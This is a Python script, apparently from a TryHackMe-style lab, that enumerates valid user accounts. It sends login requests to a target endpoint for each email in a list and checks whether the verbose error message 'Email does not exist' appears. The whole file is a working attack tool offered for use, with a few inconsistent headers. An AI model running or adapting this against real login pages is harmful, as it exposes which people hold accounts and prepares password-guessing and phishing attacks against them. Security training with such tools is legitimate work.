import requests  # Used for sending HTTP requests
import sys  # Provides access to command-line arguments

def check_email(email):
    # Function to send a POST request with the provided email and parse the response
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function (update this as needed)
    headers = {
        'Host': 'web.com',  # Update the Host header if the target URL changes
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://web.com',  # Update if the URL changes
        'Connection': 'close',
        'Referer': 'http:/web/loginpage',  # Update if the Referer URL changes
    }
    data = {
        'username': email,  # The email to check
        'password': 'password',  # Placeholder password (can be changed)
        'function': 'login'
    }

    # Send the POST request and return the JSON response
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    # Function to read emails from a file and check their validity
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message indicating an invalid email (customize based on server response)

    with open(email_file, 'r') as file:
        emails = file.readlines()  # Read all emails from the file

    for email in emails:
        email = email.strip()  # Remove whitespace around each email
        if email:
            response_json = check_email(email)  # Check the email using the API
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")  # Print invalid emails
            else:
                print(f"[VALID] {email}")  # Print valid emails
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        # Ensure correct usage
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]  # Get the email file from command-line arguments

    valid_emails = enumerate_emails(email_file)  # Run the enumeration function

    # Output the list of valid emails
    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
